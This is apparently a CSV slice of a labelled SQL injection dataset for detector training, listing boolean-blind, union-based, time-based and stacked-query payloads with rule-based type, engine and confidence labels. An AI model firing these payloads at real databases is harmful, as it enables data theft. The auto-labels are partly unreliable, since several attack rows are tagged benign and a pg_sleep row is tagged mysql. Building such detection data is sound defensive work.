row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
360,"select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
361,UNION ALL SELECT,1,,union_based,generic,0.95,"UNION ALL SELECT, UNION ALL SELECT detected — union_based injection (priority 7) on generic",rule-based
362,"select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
363,select * from users where id = 1 or \<1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
364,"select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
365,x' or full_name like '%bob%,1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
366,x' and members.email is NULL; --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
367,or 2 > 1,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
368,select * from users where id = 1.*1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
369,""" ) or pg_sleep ( __TIME__ ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
370,"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
371,"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
372,select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
373,) or sleep ( __TIME__ ) = ',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
374,sleep 50',1,,time_blind,generic,0.85,sleep 50 is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
375,"select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
376,select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
377,"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
378,or sleep ( __TIME__ ) = ',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
379,"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
380,"select * from users where id = 1 or 1#"". union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
381,"select * from users where id = 1 union select @ $,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
382,"select * from users where id = 1 union select +!<@,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
383,"select * from users where id = 1 <@<@ union select null,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
384,; exec ( 'sel' + 'ect us' + 'er' ),1,,stacked_queries,generic,0.95,; exec  detected — stacked_queries injection (priority 3) on generic,rule-based
385,anything' OR 'x' = 'x,1,,boolean_blind,generic,0.95,OR 'x' = 'x detected — boolean_blind injection (priority 8) on generic,rule-based
386,"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
387,"select * from users where id = 1 union select ( 1 ) ,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
388,"select * from users where id = 1 * ( \ ) union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
389,a' or 3 = 3--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
